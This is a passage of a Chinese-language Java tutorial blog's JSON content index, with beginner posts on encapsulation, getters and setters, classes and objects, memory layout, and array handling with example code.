int age;//学生年龄 private boolean male;//学生性别,是否是男的 public String getName()&#123; return name; &#125; public int getAge()&#123; return age; &#125; public boolean isMale()&#123; return male; &#125; public void setName(String m_name)&#123; name = m_name; &#125; public void setAge(int m_age) &#123; age = m_age; &#125; public void setMale(boolean m_setMale) &#123; male = m_setMale; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"private关键字的作用及使用","slug":"java00036private关键字的作用及使用","date":"2020-02-11T10:51:53.000Z","updated":"2020-02-11T23:08:04.415Z","comments":true,"path":"2020/02/11/java00036private关键字的作用及使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00036private关键字的作用及使用/","excerpt":"","text":"private关键字的作用及使用 问题描述:定义Person的年龄时,无法阻止不合理的数值被赋值进来 解决方案:用private关键字将需要保护的成员变量进行修饰. private 数据类型 变量名 但是!超出了本类范围之外就不能再直接访问了. private成员变量的获取和设置方法规范格式: 获取:getXxxx开头,小驼峰式法,Xxxx代表私有的成员变量名 设置:setXxxx开头,小驼峰式法,Xxxx代表私有的成员变量名 public void setXxxx(int a) { ​ xxxx = a; } public int getXxxx() { return xxxx; } 1234567891011public class Main01&#123; public static void main(String[] args) &#123; Person person = new Person(); person.name = \"张无忌\"; person.setAge(18); person.setHeight(179); person.setSex(\"男\"); person.showPersonAll(); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364package xiaochenyan.top.person;public class Person&#123; String name; private int age; //私有成员变量 private int height; //私有成员变量 private String sex; //私有成员变量 //用于设置age数据 public void setAge(int m_age) &#123; if(m_age &lt; 0) &#123; System.out.println(\"数据异常\"); return; &#125; age = m_age; &#125; //用于设置height数据 public void setHeight(int m_height) &#123; if(m_height &lt; 0) &#123; System.out.println(\"数据异常\"); return; &#125; height = m_height; &#125; //用于设置sex数据 public void setSex(String m_sex) &#123; sex = m_sex; &#125; //用于获取name数据 public String getName() &#123; return name; &#125; //用于获取sex数据 public String getSex() &#123; return sex; &#125; //用于获取age数据 public int getAge()&#123; return age; &#125; //用于获取height数据 public int getHeight() &#123; return height; &#125; //显示所有的成员变量 public void showPersonAll() &#123; System.out.println(name); System.out.println(age); System.out.println(height); System.out.println(sex); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"面向对象的三大特征","slug":"java00035面向对象的三大特征","date":"2020-02-11T10:23:40.000Z","updated":"2020-02-11T10:32:58.359Z","comments":true,"path":"2020/02/11/java00035面向对象的三大特征/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00035面向对象的三大特征/","excerpt":"","text":"面向对象的三大特征 面向对象的三大特征:封装,继承,多态 封装性在java当中体现: 1.方法就是一种封装 2.关键字private也是一种封装 封装就是将一些细节信息隐藏起来,对外界不可见. 12345678910public class Main4 &#123; public static void main(String[] args) &#123; Phone one = new Phone(); one.brand = \"苹果\"; one.price = 8388.0; one.color = \"黑色\"; one.printAll();//封装性,不用了解方法是怎么实现显示成员变量的,只需要知道怎么调用就行了. &#125;&#125; 12345678910111213public class Phone &#123; String brand;//产品 double price;//价格 String color;//颜色 public void printAll() &#123; System.out.println(brand); System.out.println(price); System.out.println(color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"局部变量和成员变量的区别","slug":"java00034局部变量和成员变量的区别","date":"2020-02-11T02:59:03.000Z","updated":"2020-02-11T03:15:47.154Z","comments":true,"path":"2020/02/11/java00034局部变量和成员变量的区别/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00034局部变量和成员变量的区别/","excerpt":"","text":"局部变量和成员变量的区别 1.定义的位置不一样 局部变量:在方法内部定义 成员变量:在方法外部定义,直接写在类当中 2.作用范围不一样 局部变量:只有方法当中才可以使用,出了方法就不能再用 成员变量:整个类全部都可以通用. 3.默认值不一样 局部变量:没有默认值,如果想使用,必须手动进行赋值 成员变量:如果没有赋值,会有默认值,规则和数组一样 4.内存的位置不一样 局部变量:位于栈内存 成员变量:位于堆区内存 5.生命周期不一样 局部变量:随着方法进栈而诞生,随着方法出栈而消失 成员变量:随着对象创建而诞生,随着对象被垃圾回收而消失 1234567891011public class Main3 &#123; public static void main(String[] args) &#123; Phone one = new Phone();//在堆区诞生 int a;//在栈区诞生 System.out.println(one.color);//默认值为null //System.out.println(a);//int a没有初始化,所以不能被使用. &#125;&#125; 123456789101112131415//类的定义public class Phone &#123; //成员变量在整个类作用域有效 String brand;//产品 double price;//价格 String color;//颜色 public void printAll() &#123; System.out.println(brand); System.out.println(price); System.out.println(color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"使用对象类型作为方法的返回值","slug":"java00033使用对象类型作为方法的返回值","date":"2020-02-11T02:10:46.000Z","updated":"2020-02-11T02:20:10.670Z","comments":true,"path":"2020/02/11/java00033使用对象类型作为方法的返回值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00033使用对象类型作为方法的返回值/","excerpt":"","text":"使用对象类型作为方法的返回值 当使用一个对象类型作为方法的返回值时:返回值其实就是对象的地址. 1234567891011121314151617public class Main2 &#123; public static void main(String[] args) &#123; Phone two = getPhone(); System.out.println(two.brand);//苹果 System.out.println(two.price);//8388.0 System.out.println(two.color);//玫瑰金 &#125; public static Phone getPhone()&#123; Phone one = new Phone(); one.brand = \"苹果\"; one.price = 8388.0; one.color = \"玫瑰金\"; return one; &#125;&#125; 1234567891011121314public class Phone &#123; String brand;//产品 double price;//价格 String color;//颜色 public void printAll() &#123; System.out.println(brand); System.out.println(price); System.out.println(color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"两个对象指向同一个引用的内存图","slug":"java00031两个对象指向同一个引用的内存图","date":"2020-02-11T01:50:54.000Z","updated":"2020-02-11T01:56:52.138Z","comments":true,"path":"2020/02/11/java00031两个对象指向同一个引用的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00031两个对象指向同一个引用的内存图/","excerpt":"","text":"两个对象指向同一个引用的内存图 其中one对象和two对象都指向同一个堆 只要其中一个对象发生改变,另一个对象也会发生改变","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"使用对象类型作为方法的参数","slug":"java00032使用对象类型作为方法的参数","date":"2020-02-11T01:48:44.000Z","updated":"2020-02-11T02:12:25.873Z","comments":true,"path":"2020/02/11/java00032使用对象类型作为方法的参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00032使用对象类型作为方法的参数/","excerpt":"","text":"使用对象类型作为方法的参数 当一个对象作为参数,传递到方法当中时,实际上传进去的是对象的地址值 1234567891011121314151617public class Main &#123; public static void main(String[] args) &#123; Phone one = new Phone(); one.brand = \"苹果\"; one.price = 8388.0; one.color = \"黑色\"; method(one); &#125; public static void method(Phone param)&#123; System.out.println(param.brand);//苹果 System.out.println(param.price);//8388.0 System.out.println(param.color);//黑色 &#125;&#125; 123456789101112131415//类的定义public class Phone &#123; String brand; double price; String color; public void printAll() &#123; System.out.println(brand); System.out.println(price); System.out.println(color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java两个对象使用同一个方的法内存","slug":"java00030两个对象使用同一个方法的内存","date":"2020-02-09T10:44:09.000Z","updated":"2020-02-09T11:03:45.735Z","comments":true,"path":"2020/02/09/java00030两个对象使用同一个方法的内存/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00030两个对象使用同一个方法的内存/","excerpt":"","text":"java两个对象使用同一个方的法内存 1.创建one对象时会创建一个堆,one指向堆地址 2.修改one.brand成员变量时,先从one找到堆地址,接着再从堆中找到brand变量,然后修改brand的值为&quot;苹果&quot; 3.修改one.price成员变量时,先从one找到堆地址,接着再从堆中找到price变量,然后修改price的值为8388.0 4.修改one.color成员变量时,先从one找到堆地址,接着再从堆中找到color变量,然后修改color的值为黑色 5.调用one.call()方法,先从one找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到one.call()方法,接着将one.call()方法压入栈. 1).初始化who参数的值为&quot;乔布斯&quot; 2).输出&quot;给xxx打电话&quot; 3).将one.call()方法退栈 4).返回到调用one.call()方法中的下一条语句 6.调用one.sendMessage()方法,先从one找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到one.sendMessage()方法,接着将one.sendMessage()方法压入栈. 1).输出&quot;群发短信&quot; 2).将one.sendMessage()方法退栈 3).返回到调用one.sendMessage()方法中的下一条语句 7.创建two对象时会创建一个堆,two指向堆地址 8.修改two.brand成员变量时,先从two找到堆地址,接着再从堆中找到brand变量,然后修改brand的值为&quot;三星&quot; 9.修改two.price成员变量时,先从two找到堆地址,接着再从堆中找到price变量,然后修改price的值为5999.0 10.修改two.color成员变量时,先从two找到堆地址,接着再从堆中找到color变量,然后修改color的值为蓝色 11.调用two.call()方法,先从two找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到two.call()方法,接着将two.call()方法压入栈. 1).初始化who参数的值为&quot;欧巴&quot; 2).输出&quot;给欧巴打电话&quot; 3).将two.call()方法退栈 4).返回到调用two.call()方法中的下一条语句 12.调用two.sendMessage()方法,先从two找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到two.sendMessage()方法,接着将two.sendMessage()方法压入栈. 1).输出&quot;群发短信&quot; 2).将two.sendMessage()方法退栈 3).返回到调用two.sendMessage()方法中的下一条语句 13.main方法结束,将main方法退栈; one对象方法和two对象方法是指向同一个方法内存的","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"一个对象的内存图","slug":"java00029一个对象的内存图","date":"2020-02-09T07:40:56.000Z","updated":"2020-02-09T10:51:42.281Z","comments":true,"path":"2020/02/09/java00029一个对象的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00029一个对象的内存图/","excerpt":"","text":"一个对象的内存图 1.创建one对象时会创建一个堆,one指向堆地址 2.修改one.brand成员变量时,先从one找到堆地址,接着再从堆中找到brand变量,然后修改brand的值为&quot;苹果&quot; 3.修改one.price成员变量时,先从one找到堆地址,接着再从堆中找到price变量,然后修改price的值为8388.0 4.修改one.color成员变量时,先从one找到堆地址,接着再从堆中找到color变量,然后修改color的值为黑色 5.调用one.call()方法,先从one找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到one.call()方法,接着将one.call()方法压入栈. 1).初始化who参数的值为&quot;乔布斯&quot; 2).输出&quot;给xxx打电话&quot; 3).将one.call()方法退栈 4).返回到调用one.call()方法中的下一条语句 6.调用one.sendMessage()方法,先从one找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到one.sendMessage()方法,接着将one.sendMessage()方法压入栈. 1).输出&quot;群发短信&quot; 2).将one.sendMessage()方法退栈 3).返回到调用one.sendMessage()方法中的下一条语句 7.main方法结束,将main方法退栈;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类的定义","slug":"java00027类的定义","date":"2020-02-09T06:37:24.000Z","updated":"2020-02-09T06:44:49.507Z","comments":true,"path":"2020/02/09/java00027类的定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00027类的定义/","excerpt":"","text":"类的定义 定义一个类,有两个组成部分: 成员属性: 事物的状态信息. 成员行为: 事物的行为. 注意事项: 1.成员变量是直接定义在类当中的,在方法外面. 2.成员方法不要写static关键字. 1234567891011121314151617181920212223242526272829303132333435363738394041424344package xiaochenyan.top.banji;/*定义一个类,用模拟\"学生\"事物.其中有两个组成部分:属性(是什么): 姓名 年龄行为(能做什么): 吃饭 睡觉 学习对应到Java的类当中:成员变量(属性): String name; int age;成员方法(行为): public void eat()&#123;&#125;; //吃饭 public void sleep()&#123;&#125;; //睡觉 public void study()&#123;&#125;; //学习*/public class Student01 &#123; //属性(成员变量) String name; int age; //行为(成员方法) public void eat()&#123; System.out.println(\"吃饭饭\"); &#125; public void sleep()&#123; System.out.println(\"睡觉觉\"); &#125; public void study()&#123; System.out.println(\"学习!\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"对象的创建及其使用","slug":"java00028对象的创建及其使用","date":"2020-02-09T06:28:42.000Z","updated":"2020-02-09T06:37:01.158Z","comments":true,"path":"2020/02/09/java00028对象的创建及其使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00028对象的创建及其使用/","excerpt":"","text":"对象的创建及其使用 1.导包: 也就是指出需要使用的类,在什么位置. import 包名称.类名称; import xiaochenyan.top.banji; 对于和当前类属于同一个包的情况,可以省略导包语句不写. 2.创建,格式 类名称 对象名 = new 类名称(); Student01 std = new Student01(); 3.使用,分为两种情况 使用成员变量,对象名.成员变量 使用成员方法,对象名.成员方法名(参数) (也就是,想用谁,就用对象名点谁) 123456789101112131415161718192021222324252627282930313233343536373839404142434445package xiaochenyan.top.banji;//导包格式import xiaochenyan.top.banji.Student01;/*1.导包: 也就是指出需要使用的类,在什么位置.import 包名称.类名称;import xiaochenyan.top.banji;对于和当前类属于同一个包的情况,可以省略导包语句不写.2.创建,格式类名称 对象名 = new 类名称();Student01 std = new Student01();3.使用,分为两种情况使用成员变量,对象名.成员变量使用成员方法,对象名.成员方法名(参数)(也就是,想用谁,就用对象名点谁) */public class test001 &#123; public static void main(String[] args) &#123; //创建对象格式 Student01 std = new Student01(); //使用成员变量格式 System.out.println(std.age); System.out.println(std.name); //使用成员方法格式 std.eat(); std.sleep(); std.study(); System.out.println(\"===========================\"); std.name = \"金毛狮王\"; std.age = 52; //使用成员变量格式 System.out.println(std.age); System.out.println(std.name); //使用成员方法格式 std.eat(); std.sleep(); std.study(); System.out.println(\"===========================\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类的定义","slug":"java00026类的定义","date":"2020-02-09T05:52:12.000Z","updated":"2020-02-09T06:04:59.484Z","comments":true,"path":"2020/02/09/java00026类的定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00026类的定义/","excerpt":"","text":"类的定义 事物与类的对比 现实世界的一类事物: 属性: 事物的状态信息 行为: 事物能够做什么 java中用class描述事物也是如此: 成员变量: 对应事物的属性 成员方法: 对应事物的行为 类的定义格式 1234public class ClassName&#123; //成员变量 //成员方法&#125; 定义类: 就是定义类的成员,包括成员变量和成员方法. 成员变量: 和以前定义变量几乎一样的,只不过位置发生了改变.在类中,在方法外. 成员方法: 和以前定义方法几乎是一样的.只不过把static去掉.","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类和对象的关系","slug":"java00025类和对象的关系","date":"2020-02-09T05:47:30.000Z","updated":"2020-02-09T05:50:15.205Z","comments":true,"path":"2020/02/09/java00025类和对象的关系/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00025类和对象的关系/","excerpt":"","text":"类和对象","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"面向对象思想的举例","slug":"java00024面向对象思想的举例","date":"2020-02-09T05:44:02.000Z","updated":"2020-02-09T05:46:38.927Z","comments":true,"path":"2020/02/09/java00024面向对象思想的举例/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00024面向对象思想的举例/","excerpt":"","text":"举例","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"面向对象思想的概述","slug":"java00023面向对象思想的概述","date":"2020-02-09T05:29:23.000Z","updated":"2020-02-09T05:41:57.338Z","comments":true,"path":"2020/02/09/java00023面向对象思想的概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00023面向对象思想的概述/","excerpt":"","text":"面向过程: 当需要实现一个功能的时候,每一个具体的步骤都要亲力亲为,详细处理每一个细节. 面向对象: 当需要实现一个功能的时候,不关心具体的步骤,而是找一个已经具有该功能的人,来帮我做事儿. 12345678910111213141516171819202122232425262728package xiaochenyan.top.banji;import java.util.Arrays;public class Student &#123; public static void main(String[] args) &#123; int[] array = &#123;1,23,4,15,51,2,52,23&#125;; //要求打印格式为[123,,123,41,123,] //使用面向过程,每一个步骤细节都要亲力亲为 System.out.print(\"[\"); for(int i = 0;i &lt; array.length;i++) &#123; if(i == array.length - 1) &#123; System.out.println(array[i] + \"]\"); &#125;else&#123; System.out.print(array[i] + \", \"); &#125; &#125; System.out.println(\"======================\"); //使用面向对象 //找一个JDK给我们提供好的Arrays类 //其中有一个toString方法,直接就能把数组变成想要的格式字符串 System.out.println(Arrays.toString(array)); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组作为方法的返回值返回","slug":"java00022数组作为方法返回值返回","date":"2020-02-08T10:20:21.000Z","updated":"2020-02-09T04:59:23.096Z","comments":true,"path":"2020/02/08/java00022数组作为方法返回值返回/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00022数组作为方法返回值返回/","excerpt":"","text":"一个方法可以有1个或多个参数;但是只能有0个或1个返回值,不能有个多返回值. 如果希望一个方法当中产生了多个结果数据进行返回 , 怎么办 ? 解决方案:使用一个数组作为返回值类型即可. 任何数据类型都能作为方法的参数类型,或者返回值类型. 数组作为方法的参数,传递进去的其实是数组的地址值 数组作为方法的返回值,返回的其实是数组的地址值 1234567891011121314151617181920public class test020 &#123; public static void main(String[] args) &#123; int[] array = sumAndPingJunShu(1,2,3); for (int i : array) &#123; System.out.println(i); &#125; &#125; public static int[] sumAndPingJunShu(int a,int b,int c) &#123; int sum = a + b + c; int pjs = (a + b + c) / 3; int cj = a * b * c; int[] array = &#123;sum,pjs,cj&#125;; return array; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组作为方法参数","slug":"java00021数组作为方法参数","date":"2020-02-08T10:12:58.000Z","updated":"2020-02-08T10:17:30.536Z","comments":true,"path":"2020/02/08/java00021数组作为方法参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00021数组作为方法参数/","excerpt":"","text":"数组可以作为方法的参数 当调用方法的时候,向方法的小括号进行传参,传递进去的其实是数组的地址值. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package xiaochenyan.top;public class test019 &#123; public static void main(String[] args) &#123; int[] array = &#123;1,234,12,4,124,21,315,15,1235,461,235,1,34632,135,124151,32515,612,351,35&#125;; arraySort(array); // 把数组地址值传递给形参 arrayOut(array); // 把数组地址值传递给形参 funFZ(array); // 把数组地址值传递给形参 arrayOut(array); // 把数组地址值传递给形参 &#125; //冒泡法排序 public static void arraySort(int[] array) &#123; for(int i = 0;i &lt; array.length - 1;i++) &#123; for(int j = 0;j &lt; array.length - (i + 1);j++) &#123; if(array[j] &lt; array[j + 1] ) &#123; int temp = array[j]; array[j] = array[j + 1]; array[j + 1] = temp; &#125; &#125; &#125; &#125; //数组遍历输出 public static void arrayOut(int[] array) &#123; for (int i : array) &#123; System.out.print(i + \" \" ); &#125; System.out.println(\"\"); System.out.println(\"===================================\"); &#125; //数组反转 public static void funFZ(int[] array) &#123; int max = array.length - 1; int min = 0; for(;min &lt; max;min++,max--) &#123; int temp = array[min]; array[min] = array[max]; array[max] = temp; &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"获取数组的最大值","slug":"java00019获取数组的最大值","date":"2020-02-08T07:37:28.000Z","updated":"2020-02-08T09:32:21.502Z","comments":true,"path":"2020/02/08/java00019获取数组的最大值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00019获取数组的最大值/","excerpt":"","text":"12345678910111213141516public class test018 &#123; public static void main(String[] args) &#123; int[] array = &#123;1,2,21,41,1235,21,12,52,2351,234,12,234,23,123412,12&#125;; int max = array[0]; for (int i = 1;i &lt; array.length;i++) &#123; if(max &lt; array[i]) // 如果max 小于 array[i],那么将array[i]的值,赋值给max &#123; max = array[i]; &#125; &#125; System.out.println(\"array数组的最大值:\" + max); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组的遍历输出","slug":"java00020数组的遍历输出","date":"2020-02-08T07:25:09.000Z","updated":"2020-02-08T09:32:08.533Z","comments":true,"path":"2020/02/08/java00020数组的遍历输出/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00020数组的遍历输出/","excerpt":"","text":"遍历数组,说的就是对数组当中的每一个元素进行逐一处理.默认的处理方式就是打印输出. 123456789101112131415161718public class test017 &#123; public static void main(String[] args) &#123; int[] array = &#123;1,2,324,12,234,15,12,51,234,21&#125;; //第一种方法,将array的每一个元素逐次赋值给i for (int i : array) &#123; System.out.println(i); &#125; System.out.println(\"======================\"); //第二种方法,将i当做array的下标,通过i的不断增加,来打印array数组,且i小于array.length for (int i = 0; i &lt; array.length;i++) &#123; System.out.println(array[i]); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"获取数组长度","slug":"java00017获取数组长度","date":"2020-02-08T07:13:31.000Z","updated":"2020-02-08T07:16:52.078Z","comments":true,"path":"2020/02/08/java00017获取数组长度/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00017获取数组长度/","excerpt":"","text":"如何获取数组的长度,格式: 数组名称.length 这将会得到一个int数字,代表数组的长度. 数组一旦创建,程序运行期间,长度不可发生改变. 123456789101112131415161718192021/*如何获取数组的长度,格式:数组名称.length这将会得到一个int数字,代表数组的长度.数组一旦创建,程序运行期间,长度不可发生改变. */public class test016 &#123; public static void main(String[] args) &#123; int[] arrayA = &#123;12,12,324,5,15,12,535,13&#125;; //获取数组arrayA的长度 System.out.println(\"arrayA数组的长度:\" + arrayA.length); int[] arrayB = new int[3]; //获取数组arrayB的长度 System.out.println(\"arrayB数组的长度:\" + arrayB.length); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组元素反转","slug":"java00018数组元素反转","date":"2020-02-08T07:13:31.000Z","updated":"2020-02-08T09:09:01.983Z","comments":true,"path":"2020/02/08/java00018数组元素反转/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00018数组元素反转/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class test019 &#123; public static void main(String[] args) &#123; int[] array = &#123;1,234,12,4,124,21,315,15,1235,461,235,1,34632,135,124151,32515,612,351,35&#125;; //数组排序 arraySort(array); //数组遍历输出 arrayOut(array); //数组反转 funFZ(array); //数组遍历输出 arrayOut(array); &#125; //冒泡法排序 public static void arraySort(int[] array) &#123; for(int i = 0;i &lt; array.length - 1;i++) &#123; for(int j = 0;j &lt; array.length - (i + 1);j++) &#123; if(array[j] &lt; array[j + 1] ) &#123; int temp = array[j]; array[j] = array[j + 1]; array[j + 1] = temp; &#125; &#125; &#125; &#125; //数组遍历输出 public static void arrayOut(int[] array) &#123; for (int i : array) &#123; System.out.print(i + \" \" ); &#125; System.out.println(\"\"); System.out.println(\"===================================\"); &#125; //数组反转 public static void funFZ(int[] array) &#123; int max = array.length - 1; int min = 0; for(;min &lt; max;min++,max--) &#123; int temp = array[min]; array[min] = array[max]; array[max] = temp; &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"常见问题 空指针异常","slug":"java00016常见问题-空指针异常","date":"2020-02-08T06:59:12.000Z","updated":"2020-02-08T07:06:45.688Z","comments":true,"path":"2020/02/08/java00016常见问题-空指针异常/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00016常见问题-空指针异常/","excerpt":"","text":"所有的引用类型变量,都可以赋值为一个null值.但是代表其中什么都没有. 数组必须进行new初始化才能使用其中的元素 如果只是赋值了一个null,没有进行new创建, 那么将会发生: 空指针异常 NullPointerException 原因:忘了补new 解决:补上new 1234567891011121314151617181920public class test015 &#123; /* 所有的引用类型变量,都可以赋值为一个null值.但是代表其中什么都没有. 数组必须进行new初始化才能使用其中的元素 如果只是赋值了一个null,没有进行new创建, 那么将会发生: 空指针异常 NullPointerException 原因:忘了补new 解决:补上new */ public static void main(String[] args) &#123; int[] array = null; //array = new int[3]; System.out.println(array[0]);//空指针异常 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组索引越界异常","slug":"java00015数组索引越界异常","date":"2020-02-08T06:46:01.000Z","updated":"2020-02-08T06:59:30.245Z","comments":true,"path":"2020/02/08/java00015数组索引越界异常/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00015数组索引越界异常/","excerpt":"","text":"数组索引从0开始,一直到数组长度-1为止. 如果访问数组元素的时候,索引编号并不存在,那么将会发生数组索引越界异常 提示:ArrayIndexOutOfBoundsException 原因: 索引编号写错了 解决: 修改成为存在的正确索引编号. 1234567891011121314151617181920212223package xiaochenyan.top;public class test014 &#123; /* 数组索引从0开始,一直到数组长度-1为止. 如果访问数组元素的时候,索引编号并不存在,那么将会发生数组索引越界异常 ArrayIndexOutOfBoundsException 原因: 索引编号写错了 解决: 修改成为存在的正确索引编号. */ public static void main(String[] args) &#123; int[] array = new int[4]; array[0] = 1; array[1] = 2; array[2] = 3; array[3] = 4; // 数组越界,发生异常,导致错误 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"两个引用指向同一个数组","slug":"java00014两个引用指向同一个数组","date":"2020-02-07T20:05:38.000Z","updated":"2020-02-07T20:08:12.994Z","comments":true,"path":"2020/02/08/java00014两个引用指向同一个数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00014两个引用指向同一个数组/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132package xiaochenyan.top;public class test013 &#123; public static void main(String[] args) &#123; int[] arrayA = new int[3]; System.out.println(arrayA); System.out.println(arrayA[0]); System.out.println(arrayA[1]); System.out.println(arrayA[2]); System.out.println(&quot;====================&quot;); arrayA[1] = 10; arrayA[2] = 20; System.out.println(arrayA); System.out.println(arrayA[0]); System.out.println(arrayA[1]); System.out.println(arrayA[2]); System.out.println(&quot;====================&quot;); int[] arrayB = arrayA; System.out.println(arrayB); System.out.println(arrayB[0]); System.out.println(arrayB[1]); System.out.println(arrayB[2]); System.out.println(&quot;====================&quot;); arrayB[1] = 10; arrayB[2] = 20; System.out.println(arrayB); System.out.println(arrayB[0]); System.out.println(arrayB[1]); System.out.println(arrayB[2]); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"两个数组的内存图","slug":"java00013两个数组的内存图","date":"2020-02-07T19:28:56.000Z","updated":"2020-02-07T19:35:14.584Z","comments":true,"path":"2020/02/08/java00013两个数组的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00013两个数组的内存图/","excerpt":"","text":"1234567891011121314package xiaochenyan.top;public class test012 &#123; public static void main(String[] args) &#123; int[] array1 = new int[3]; //创建一个包含三个元素的array1数组 System.out.println(array1); //打印array1的地址 array1[1] = 2; //修改array1[1]的值 array1[2] = 100; //修改array1[2]的值 int[] array2 = new int[3]; //创建一个包含三个元素的array2数组 System.out.println(array2); //打印array2的地址 array2[1] = 300; //修改array2[1]的值 array2[2] = 25; //修改array2[2]的值 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"一个数组的内存图","slug":"java00012一个数组的内存图","date":"2020-02-07T18:51:11.000Z","updated":"2020-02-07T18:55:45.444Z","comments":true,"path":"2020/02/08/java00012一个数组的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00012一个数组的内存图/","excerpt":"","text":"12345678910111213public class test011 &#123; public static void main(String[] args) &#123; int[] array = new int[3];//从堆区创建一个包含三个元素的数组 System.out.println(array); array[1] = 2; //从堆区把array[1]的值修改成2 array[2] = 200;//从堆区把array[2]的值修改成100 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Java中的内存划分","slug":"java00011Java中的内存划分","date":"2020-02-07T15:10:32.000Z","updated":"2020-02-07T15:42:07.946Z","comments":true,"path":"2020/02/07/java00011Java中的内存划分/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/07/java00011Java中的内存划分/","excerpt":"","text":"Java的内存需要划分成为5个部分 1.栈（Stack）: 存放的都是方法中的局部变量。方法的运行一定要在栈当中运行。 局部变量：方法的参数，或者是方法{}内部的变量 作用域：一但超出作用域，立刻从栈内存中消失。 2.堆（Heap）：凡是new出来的内存，都在堆区中。 